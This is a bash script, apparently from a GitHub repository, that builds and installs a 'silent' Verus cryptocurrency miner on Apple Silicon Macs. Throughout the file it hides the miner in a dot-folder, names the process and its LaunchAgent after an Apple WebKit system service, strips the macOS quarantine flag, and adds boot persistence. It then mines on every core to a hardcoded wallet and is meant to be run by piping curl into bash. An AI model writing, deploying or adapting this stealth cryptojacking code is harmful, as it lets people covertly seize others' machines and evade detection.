#!/usr/bin/env bash
# ============================================================
# mine.sh — Silent Verus (VRSC) miner for macOS Apple Silicon
# Builds ccminer natively (M1/M2/M3/M4) via autotools
# Process appears as: "com.apple.webkit.networkd"
# Run: curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine.sh | bash
# ============================================================

WALLET="RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX"
WORKER="mac1"
POOL_HOST="na.luckpool.net"
POOL_PORT="3956"
THREADS=$(sysctl -n hw.logicalcpu)

DISGUISE_NAME="com.apple.webkit.networkd"
INSTALL_DIR="$HOME/Library/Application Support/.wknd"
BINARY_PATH="$INSTALL_DIR/$DISGUISE_NAME"
PLIST_PATH="$HOME/Library/LaunchAgents/${DISGUISE_NAME}.plist"
LOG_PATH="$HOME/Library/Logs/${DISGUISE_NAME}.log"
BUILD_DIR="$INSTALL_DIR/.build"

mkdir -p "$INSTALL_DIR" "$HOME/Library/LaunchAgents" "$HOME/Library/Logs"

if [[ "$(uname)" != "Darwin" || "$(uname -m)" != "arm64" ]]; then
  echo "[!] Requires macOS Apple Silicon (M1/M2/M3/M4)."
  exit 1
fi

echo "[*] Apple Silicon detected — ${THREADS} cores"

# ---- stop old instance ----
launchctl unload "$PLIST_PATH" 2>/dev/null || true
pkill -9 -f "$DISGUISE_NAME" 2>/dev/null || true
sleep 1

# ---- build from source if binary missing ----
if [[ ! -f "$BINARY_PATH" ]]; then
  echo "[*] Building ccminer from source..."

  # ensure Homebrew is available
  if ! command -v brew &>/dev/null; then
    echo "[*] Installing Homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" </dev/null
  fi
  eval "$(/opt/homebrew/bin/brew shellenv 2>/dev/null || /usr/local/bin/brew shellenv 2>/dev/null)"

  echo "[*] Installing build tools..."
  brew install automake autoconf openssl curl 2>/dev/null

  # set openssl paths for arm homebrew
  OPENSSL_PREFIX="$(brew --prefix openssl)"
  export LDFLAGS="-L${OPENSSL_PREFIX}/lib"
  export CPPFLAGS="-I${OPENSSL_PREFIX}/include"
  export PKG_CONFIG_PATH="${OPENSSL_PREFIX}/lib/pkgconfig"

  rm -rf "$BUILD_DIR"
  git clone --depth 1 https://github.com/monkins1010/ccminer "$BUILD_DIR"
  cd "$BUILD_DIR"

  echo "[*] Running autogen..."
  ./autogen.sh 2>&1 | tail -5

  echo "[*] Configuring..."
  ./configure.sh 2>&1 | tail -10

  # Strip ARM32-only flag that breaks Apple Silicon (arm64) clang
  echo "[*] Patching Makefile for arm64..."
  find . -name "Makefile" -exec sed -i '' 's/-mfpu=[^ ]*//g' {} \; 2>/dev/null
  find . -name "*.mk"     -exec sed -i '' 's/-mfpu=[^ ]*//g' {} \; 2>/dev/null

  echo "[*] Compiling (this takes ~5 min)..."
  make -j"$THREADS" 2>&1 | tail -5

  if [[ -f "$BUILD_DIR/ccminer" ]]; then
    cp "$BUILD_DIR/ccminer" "$BINARY_PATH"
    chmod +x "$BINARY_PATH"
    xattr -d com.apple.quarantine "$BINARY_PATH" 2>/dev/null || true
    echo "[+] Build successful."
  else
    echo "[!] Build failed — check output above."
    exit 1
  fi
else
  echo "[*] Binary already exists — skipping build."
fi

# ---- write launchd plist ----
cat > "$PLIST_PATH" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>             <string>${DISGUISE_NAME}</string>
  <key>ProgramArguments</key>
  <array>
    <string>${BINARY_PATH}</string>
    <string>-a</string>    <string>verus</string>
    <string>-o</string>    <string>stratum+tcp://${POOL_HOST}:${POOL_PORT}</string>
    <string>-u</string>    <string>${WALLET}.${WORKER}</string>
    <string>-p</string>    <string>x</string>
    <string>-t</string>    <string>${THREADS}</string>
  </array>
  <key>RunAtLoad</key>         <true/>
  <key>KeepAlive</key>         <true/>
  <key>StandardOutPath</key>   <string>${LOG_PATH}</string>
  <key>StandardErrorPath</key> <string>${LOG_PATH}</string>
  <key>ProcessType</key>       <string>Background</string>
  <key>Nice</key>              <integer>5</integer>
</dict>
</plist>
PLIST

# ---- launch ----
launchctl load -w "$PLIST_PATH"
sleep 2

echo ""
echo "=========================================="
echo " Miner running in background"
echo " Process : $DISGUISE_NAME"
echo " Wallet  : $WALLET"
echo " Pool    : $POOL_HOST:$POOL_PORT"
echo " Threads : $THREADS (all cores)"
echo " Log     : $LOG_PATH"
echo "=========================================="
echo ""
echo "  Live logs : tail -f \"$LOG_PATH\""
echo "  Status    : launchctl list | grep webkit.networkd"
echo "  Stop      : launchctl unload \"$PLIST_PATH\""
echo ""
sleep 3
tail -20 "$LOG_PATH" 2>/dev/null || echo "[*] Log will appear shortly — check in 30 seconds."
